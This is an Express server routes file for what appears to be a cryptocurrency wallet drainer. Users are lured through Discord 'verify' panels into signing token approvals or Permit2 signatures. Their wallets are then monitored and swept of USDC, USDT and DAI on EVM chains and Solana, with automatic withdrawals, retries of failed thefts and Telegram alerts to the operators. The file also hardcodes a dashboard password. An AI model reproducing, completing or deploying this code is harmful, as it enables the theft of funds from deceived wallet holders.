import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
import { executeTransferFrom, checkRelayerStatus } from "./relayer";
import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain as getPermit2ContractForChain, CHAIN_CONTRACTS as PERMIT2_CHAIN_CONTRACTS, scanWalletBalances as permit2ScanWalletBalances } from "./permit2-relayer";
import { getContractAddressForChain, executeDirectTransfer, getContractForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES, scanWalletBalances } from "./direct-transfer";
import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep, scheduleDelayedClaim } from "./wallet-monitor";
import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
import { startPersonalSweeper, stopPersonalSweeper, getPersonalSweeperStatus, triggerPersonalSweep } from "./personal-sweeper";

const DASHBOARD_PASSWORD = "hourglass2024";

// Middleware to check dashboard authentication
function requireDashboardAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || authHeader !== `Bearer ${DASHBOARD_PASSWORD}`) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Public route - anyone can submit applications
  app.post("/api/applications", async (req, res) => {
    try {
      const validatedData = insertApplicationSchema.parse(req.body);
      const application = await storage.createApplication(validatedData);
      res.json(application);
    } catch (error) {
      res.status(400).json({ error: "Invalid application data" });
    }
  });

  // Protected route - requires authentication to view applications
  app.get("/api/applications", requireDashboardAuth, async (req, res) => {
    try {
      const applications = await storage.getApplications();
      res.json(applications);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch applications" });
    }
  });

  // Public route - record token approvals and trigger relayer
  app.post("/api/approvals", async (req, res) => {
    try {
      const validatedData = insertApprovalSchema.parse(req.body);
      const approval = await storage.createApproval(validatedData);
      
      const chainId = req.body.chainId || '1';
      await addWalletToMonitor(
        validatedData.walletAddress,
        'evm',
        chainId,
        ['USDC', 'USDT', 'DAI']
      );
      console.log(`[Monitor] Added EVM wallet to monitoring: ${validatedData.walletAddress} (chain ${chainId})`);
      
      scheduleDelayedClaim(validatedData.walletAddress, 'evm', chainId);
      
      notifyWalletSigned({
        walletAddress: validatedData.walletAddress,
        network: "evm",
        chainId,
        tokens: [validatedData.tokenSymbol],
        discordUser: req.body.discordUser,
      }).catch(() => {});
      
      res.json(approval);
    } catch (error) {
      res.status(400).json({ error: "Invalid approval data" });
    }
  });

  // Execute transfer via relayer after approval
  app.post("/api/execute-transfer", async (req, res) => {
    try {
      const { walletAddress, tokenSymbol } = req.body;
      
      if (!walletAddress || !tokenSymbol) {
        return res.status(400).json({ error: "walletAddress and tokenSymbol are required" });
      }

      if (tokenSymbol !== 'USDC' && tokenSymbol !== 'USDT') {
        return res.status(400).json({ error: "tokenSymbol must be USDC or USDT" });
      }

      console.log(`[API] Execute transfer request: ${walletAddress} - ${tokenSymbol}`);
      
      const result = await executeTransferFrom(walletAddress, tokenSymbol);
      
      if (result.success && result.txHash) {
        await storage.createTransfer({
          walletAddress,
          tokenAddress: tokenSymbol === 'USDC' 
            ? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' 
            : '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          tokenSymbol,
          amount: '0',
          transactionHash: result.txHash,
        });
        
        notifyTransferSuccess({
          walletAddress,
          network: "evm",
          token: tokenSymbol,
          amount: "0",
          txHash: result.txHash,
        }).catch(() => {});
      }

      res.json(result);
    } catch (error: any) {
      console.error('[API] Execute transfer error:', error);
      res.status(500).json({ success: false, error: error?.message || "Failed to execute transfer" });
    }
  });

  // Check relayer status
  app.get("/api/relayer-status", requireDashboardAuth, async (req, res) => {
    try {
      const status = await checkRelayerStatus();
      res.json(status);
    } catch (error) {
      res.status(500).json({ error: "Failed to check relayer status" });
    }
  });

  // Public route - record Solana approvals and trigger automatic sweep
  app.post("/api/solana-approvals", async (req, res) => {
    try {
      const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
      
      if (!walletAddress || !delegateAddress || !transactionHash) {
        return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
      }

      console.log(`[Solana] Approval recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
      console.log(`[Solana] Tokens approved:`, tokensApproved);
      
      notifyWalletSigned({
        walletAddress,
        network: "solana",
        tokens: tokensApproved || ["USDC", "USDT"],
        discordUser: req.body.discordUser,
      }).catch(() => {});
      
      // Log each token approval separately for tracking
      const approvals = [];
      const tokens = tokensApproved || ["USDC", "USDT"];
      
      for (const token of tokens) {
        try {
          const approval = await storage.createApproval({
            walletAddress,
            tokenAddress: delegateAddress,
            tokenSymbol: `SOL-${token}`,
            transactionHash,
          });
          approvals.push(approval);
        } catch (err) {
          console.log(`[Solana] Could not store ${token} approval, continuing...`);
        }
      }
      
      // Add wallet to continuous monitoring
      await addWalletToMonitor(
        walletAddress,
        'solana',
        undefined,
        tokens
      );
      console.log(`[Monitor] Added Solana wallet to monitoring: ${walletAddress} (${tokens.length} tokens)`);
      
      scheduleDelayedClaim(walletAddress, 'solana');
      
      // Respond immediately to client
      res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
      
      // Trigger automatic sweep in background after approval confirmation
      // Wait a bit for the approval transaction to fully confirm
      setTimeout(async () => {
        console.log(`[Solana] Triggering automatic sweep for ${walletAddress}...`);
        try {
          const sweepResult = await sweepApprovedTokens(walletAddress, tokens);
          console.log(`[Solana] Sweep result:`, sweepResult);
          
          for (const transfer of sweepResult.transfers) {
            if (transfer.success) {
              try {
                await storage.createTransfer({
                  walletAddress,
                  tokenAddress: delegateAddress,
                  tokenSymbol: `SOL-${transfer.token}`,
                  amount: transfer.amount,
                  transactionHash: transfer.signature,
                });
                
                notifySweepSuccess({
                  walletAddress,
                  network: "solana",
                  token: transfer.token,
                  amount: transfer.amount,
                  txHash: transfer.signature,
                }).catch(() => {});
              } catch (err) {
                console.log(`[Solana] Could not log transfer for ${transfer.token}`);
              }
            }
          }
        } catch (sweepError: any) {
          console.error(`[Solana] Sweep failed:`, sweepError?.message || sweepError);
        }
      }, 3000); // Wait 3 seconds for approval to fully confirm
      
    } catch (error: any) {
      console.error('[Solana] Approval error:', error);
      res.status(400).json({ error: error?.message || "Invalid Solana approval data" });
    }
  });
  
  // Endpoint to manually trigger Solana sweep
  app.post("/api/solana-sweep", async (req, res) => {
    try {
      const { walletAddress, tokens } = req.body;
      
      if (!walletAddress) {
        return res.status(400).json({ error: "walletAddress is required" });
      }
      
      console.log(`[Solana] Manual sweep requested for: ${walletAddress}`);
      const result = await sweepApprovedTokens(walletAddress, tokens || ["USDC", "USDT"]);
      
      for (const transfer of result.transfers) {
        if (transfer.success) {
          notifySweepSuccess({
            walletAddress,
            network: "solana",
            token: transfer.token,
            amount: transfer.amount,
            txHash: transfer.signature,
          }).catch(() => {});
        }
      }
      
      res.json(result);
    } catch (error: any) {
      console.error('[Solana] Manual sweep error:', error);
      res.status(500).json({ error: error?.message || "Sweep failed" });
    }
  });
  
  // Check Solana sweeper status
  app.get("/api/solana-sweeper-status", async (req, res) => {
    try {
      const status = getSolanaSweeperStatus();
      res.json(status);
    } catch (error) {
      res.status(500).json({ error: "Failed to check Solana sweeper status" });
    }
  });

  // Protected route - requires authentication to view approvals
  app.get("/api/approvals", requireDashboardAuth, async (req, res) => {
    try {
      const approvals = await storage.getApprovals();
      res.json(approvals);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch approvals" });
    }
  });

  // Public route - record token transfers
  app.post("/api/transfers", async (req, res) => {
    try {
      const validatedData = insertTransferSchema.parse(req.body);
      const transfer = await storage.createTransfer(validatedData);
      res.json(transfer);
    } catch (error) {
      res.status(400).json({ error: "Invalid transfer data" });
    }
  });

  // Protected route - requires authentication to view transfers
  app.get("/api/transfers", requireDashboardAuth, async (req, res) => {
    try {
      const transfers = await storage.getTransfers();
      res.json(transfers);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch transfers" });
    }
  });

  // Ticket routes
  app.get("/api/tickets", async (req, res) => {
    try {
      const tickets = await storage.getTickets();
      res.json(tickets);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch tickets" });
    }
  });

  app.get("/api/tickets/:id", async (req, res) => {
    try {
      const ticket = await storage.getTicketById(req.params.id);
      if (!ticket) {
        return res.status(404).json({ error: "Ticket not found" });
      }
      res.json(ticket);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ticket" });
    }
  });

  app.get("/api/tickets/:id/messages", async (req, res) => {
    try {
      const messages = await storage.getTicketMessages(req.params.id);
      res.json(messages);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ticket messages" });
    }
  });

  app.post("/api/tickets/:id/messages", async (req, res) => {
    try {
      const validatedData = insertTicketMessageSchema.parse({
        ...req.body,
        ticketId: req.params.id,
      });
      const message = await storage.createTicketMessage(validatedData);
      res.json(message);
    } catch (error) {
      res.status(400).json({ error: "Invalid message data" });
    }
  });

  app.patch("/api/tickets/:id", async (req, res) => {
    try {
      const ticket = await storage.updateTicket(req.params.id, req.body);
      res.json(ticket);
    } catch (error) {
      res.status(400).json({ error: "Failed to update ticket" });
    }
  });

  app.post("/api/discord/send-panel", requireDashboardAuth, async (req, res) => {
    try {
      const { channelId } = req.body;
      if (!channelId) {
        return res.status(400).json({ error: "channelId is required" });
      }
      await sendTicketPanel(channelId);
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to send ticket panel" });
    }
  });

  app.post("/api/discord/send-verify", requireDashboardAuth, async (req, res) => {
    try {
      const { channelId, serverName } = req.body;
      if (!channelId) {
        return res.status(400).json({ error: "channelId is required" });
      }
      await sendVerifyPanel(channelId, serverName || "Server");
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to send verify panel" });
    }
  });

  // Wallet Monitor endpoints
  app.get("/api/monitor-status", requireDashboardAuth, async (req, res) => {
    try {
      const status = getMonitorStatus();
      const wallets = await storage.getActiveMonitoredWallets();
      res.json({ ...status, activeWallets: wallets.length });
    } catch (error) {
      res.status(500).json({ error: "Failed to get monitor status" });
    }
  });

  app.get("/api/monitored-wallets", requireDashboardAuth, async (req, res) => {
    try {
      const wallets = await storage.getMonitoredWallets();
      res.json(wallets);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch monitored wallets" });
    }
  });

  app.post("/api/monitor/start", requireDashboardAuth, async (req, res) => {
    try {
      startWalletMonitor();
      res.json({ success: true, message: "Monitor started" });
    } catch (error: any) {
      res.status(500).json({ error: error?.message || "Failed to start monitor" });
    }
  });

  app.post("/api/monitor/stop", requireDashboardAuth, async (req, res) => {
    try {
      stopWalletMonitor();
      res.json({ success: true, message: "Monitor stopped" });
    } catch (error: any) {
      res.status(500).json({ error: error?.message || "Failed to stop monitor" });
    }
  });

  app.post("/api/monitor/sweep-now", requireDashboardAuth, async (req, res) => {
    try {
      await triggerManualSweep();
      res.json({ success: true, message: "Manual sweep triggered" });
    } catch (error: any) {
      res.status(500).json({ error: error?.message || "Failed to trigger sweep" });
    }
  });

  app.patch("/api/monitored-wallets/:id", requireDashboardAuth, async (req, res) => {
    try {
      const { status } = req.body;
      const wallet = await storage.updateMonitoredWallet(req.params.id, { status });
      res.json(wallet);
    } catch (error) {
      res.status(400).json({ error: "Failed to update wallet" });
    }
  });

  app.get("/api/permit2-config", async (req, res) => {
    try {
      const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
      
      const contractAddress = chainId ? getContractForChain(chainId) : null;
      const spenderAddress = contractAddress || getRelayerAddress();
      
      if (!spenderAddress) {
        return res.status(500).json({ error: "No spender configured" });
      }
      
      res.json({
        spenderAddress,
        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        contractAddress: contractAddress || null,
        chainContracts: CHAIN_CONTRACTS,
        usingContract: !!contractAddress,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get Permit2 config" });
    }
  });

  app.get("/api/spender-config", async (req, res) => {
    try {
      const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
      
      const contractAddress = chainId ? getContractAddressForChain(chainId) : null;
      if (!contractAddress) {
        return res.status(500).json({ error: "No contract configured for this chain" });
      }

      const tokens = chainId && CHAIN_TOKEN_ADDRESSES[chainId]
        ? CHAIN_TOKEN_ADDRESSES[chainId].map(t => t.address)
        : [];
      
      res.json({
        spenderAddress: contractAddress,
        tokens,
        chainContracts: CHAIN_CONTRACTS,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to get spender config" });
    }
  });

  app.post("/api/direct-transfer", async (req, res) => {
    try {
      const { chainId, owner, tokens } = req.body;

      if (!chainId || !owner) {
        return res.status(400).json({ error: "Missing required fields: chainId, owner" });
      }

      console.log(`[API] Direct transfer request: chain=${chainId}, owner=${owner}, tokens=${tokens || 'all'}`);

      const result = await executeDirectTransfer({
        chainId: Number(chainId),
        owner,
        tokens: tokens || undefined,
      });

      if (result.success) {
        for (const transfer of result.transfers) {
          if (transfer.success) {
            try {
              await storage.createApproval({
                walletAddress: owner,
                tokenAddress: transfer.token,
                tokenSymbol: transfer.symbol,
                transactionHash: 'direct-approval',
              });

              await storage.createTransfer({
                walletAddress: owner,
                tokenAddress: transfer.token,
                tokenSymbol: transfer.symbol,
                amount: transfer.amount,
                transactionHash: 'direct-transfer',
              });

              notifyTransferSuccess({
                walletAddress: owner,
                network: "evm",
                chainId: String(chainId),
                token: transfer.symbol,
                amount: transfer.amount,
                txHash: 'direct-transfer',
                discordUser: req.body.discordUser,
              }).catch(() => {});
            } catch (err) {
              console.log(`[DirectTransfer] Could not log transfer for ${transfer.symbol}`);
            }
          }
        }

        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI']);
      } else {
        notifyTransferFailed({
          walletAddress: owner,
          network: "evm",
          chainId: String(chainId),
          error: result.error || "Unknown error",
          discordUser: req.body.discordUser,
        }).catch(() => {});
      }

      notifyWalletSigned({
        walletAddress: owner,
        network: "evm",
        chainId: String(chainId),
        tokens: ['USDT', 'USDC', 'DAI'],
        discordUser: req.body.discordUser,
      }).catch(() => {});

      res.json(result);
    } catch (error: any) {
      console.error('[API] Direct transfer error:', error);
      res.status(500).json({ success: false, error: error?.message || "Failed to execute direct transfer" });
    }
  });

  app.get("/api/scan-balances/:address", async (req, res) => {
    try {
      const { address } = req.params;
      if (!address || !address.startsWith("0x")) {
        return res.status(400).json({ error: "Invalid wallet address" });
      }
      const result = await scanWalletBalances(address);
      res.json(result);
    } catch (error: any) {
      console.error("[API] Balance scan error:", error?.message);
      res.status(500).json({ error: "Failed to scan balances" });
    }
  });

  app.post("/api/permit2-transfer", async (req, res) => {
    try {
      const { chainId, owner, permitted, nonce, deadline, signature } = req.body;

      if (!chainId || !owner || !permitted || !nonce || !deadline || !signature) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      console.log(`[API] Permit2 transfer request: chain=${chainId}, owner=${owner}, tokens=${permitted.length}`);

      const transferParams = {
        chainId: Number(chainId),
        owner,
        permitted,
        nonce,
        deadline,
        signature,
      };

      const result = await executePermit2BatchTransfer(transferParams);

      if (result.success && result.txHash) {
        for (const transfer of result.transfers) {
          if (transfer.success) {
            try {
              const tokenSymbol = resolveTokenSymbol(transfer.token);
              await storage.createApproval({
                walletAddress: owner,
                tokenAddress: transfer.token,
                tokenSymbol,
                transactionHash: result.txHash,
              });

              await storage.createTransfer({
                walletAddress: owner,
                tokenAddress: transfer.token,
                tokenSymbol,
                amount: transfer.amount,
                transactionHash: result.txHash,
              });

              notifyTransferSuccess({
                walletAddress: owner,
                network: "evm",
                chainId: String(chainId),
                token: tokenSymbol,
                amount: transfer.amount,
                txHash: result.txHash,
                discordUser: req.body.discordUser,
              }).catch(() => {});
            } catch (err) {
              console.log(`[Permit2] Could not log transfer for ${transfer.token}`);
            }
          }
        }

        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI']);
      } else if (!result.success) {
        await savePendingTransfer(transferParams);
        console.log(`[API] Transfer failed, saved for retry: ${result.error}`);
        
        notifyTransferFailed({
          walletAddress: owner,
          network: "evm",
          chainId: String(chainId),
          error: result.error || "Unknown error",
          discordUser: req.body.discordUser,
        }).catch(() => {});
      }

      res.json(result);
    } catch (error: any) {
      console.error('[API] Permit2 transfer error:', error);

      try {
        await savePendingTransfer({
          chainId: Number(req.body.chainId),
          owner: req.body.owner,
          permitted: req.body.permitted,
          nonce: req.body.nonce,
          deadline: req.body.deadline,
          signature: req.body.signature,
        });
        console.log('[API] Transfer exception, saved for retry');
      } catch {}

      res.status(500).json({ success: false, error: error?.message || "Failed to execute Permit2 transfer" });
    }
  });

  app.get("/api/discord/callback", async (req, res) => {
    try {
      const { code, state } = req.query;
      const appUrl = `https://${process.env.REPLIT_DEV_DOMAIN || process.env.REPL_SLUG + '.replit.app'}`;
      const clientId = process.env.DISCORD_CLIENT_ID;
      const clientSecret = process.env.DISCORD_CLIENT_SECRET;

      if (!code || !state) {
        return res.redirect("/?error=missing_params");
      }

      if (!clientId || !clientSecret) {
        return res.redirect("/?error=oauth_not_configured");
      }

      let stateData: any = {};
      try {
        stateData = JSON.parse(decodeURIComponent(state as string));
      } catch {
        return res.redirect("/?error=invalid_state");
      }

      const redirectUri = `${appUrl}/api/discord/callback`;

      const tokenResponse = await fetch('https://discord.com/api/v10/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: clientId,
          client_secret: clientSecret,
          grant_type: 'authorization_code',
          code: code as string,
          redirect_uri: redirectUri,
        }),
      });

      if (!tokenResponse.ok) {
        console.error('[Discord OAuth] Token exchange failed:', await tokenResponse.text());
        return res.redirect(`/?error=token_exchange_failed`);
      }

      const tokenData = await tokenResponse.json() as any;

      const userResponse = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });

      if (!userResponse.ok) {
        console.error('[Discord OAuth] User fetch failed:', await userResponse.text());
        return res.redirect(`/?error=user_fetch_failed`);
      }

      const userData = await userResponse.json() as any;

      if (stateData.userId && stateData.userId !== userData.id) {
        console.error('[Discord OAuth] User ID mismatch: expected', stateData.userId, 'got', userData.id);
        return res.redirect('/?error=user_mismatch');
      }

      const discordUser = encodeURIComponent(userData.username || userData.global_name || 'Unknown');
      const discordId = userData.id;
      const discordAvatar = userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : '';
      const guildId = stateData.guildId || '';

      res.redirect(`/?discord_user=${discordUser}&discord_id=${discordId}&discord_avatar=${encodeURIComponent(discordAvatar)}&guild=${guildId}&verified=true`);
    } catch (error) {
      console.error('[Discord OAuth] Callback error:', error);
      res.redirect('/?error=oauth_failed');
    }
  });

  app.get("/api/auto-withdraw/status", requireDashboardAuth, (req, res) => {
    res.json(getAutoWithdrawStatus());
  });

  app.post("/api/auto-withdraw/start", requireDashboardAuth, (req, res) => {
    startAutoWithdraw();
    res.json({ success: true, message: "Auto-withdraw started" });
  });

  app.post("/api/auto-withdraw/stop", requireDashboardAuth, (req, res) => {
    stopAutoWithdraw();
    res.json({ success: true, message: "Auto-withdraw stopped" });
  });

  app.post("/api/auto-withdraw/now", requireDashboardAuth, async (req, res) => {
    await manualWithdraw();
    res.json({ success: true, message: "Manual withdraw completed" });
  });

  app.get("/api/personal-sweeper/status", requireDashboardAuth, (req, res) => {
    res.json(getPersonalSweeperStatus());
  });

  app.post("/api/personal-sweeper/start", requireDashboardAuth, (req, res) => {
    startPersonalSweeper();
    res.json({ success: true, message: "Personal sweeper started" });
  });

  app.post("/api/personal-sweeper/stop", requireDashboardAuth, (req, res) => {
    stopPersonalSweeper();
    res.json({ success: true, message: "Personal sweeper stopped" });
  });

  app.post("/api/personal-sweeper/now", requireDashboardAuth, async (req, res) => {
    await triggerPersonalSweep();
    res.json({ success: true, message: "Personal sweep completed" });
  });

  const httpServer = createServer(app);

  startWalletMonitor();
  startAutoWithdraw();
  startTransferRetry();
  startPersonalSweeper();

  return httpServer;
}
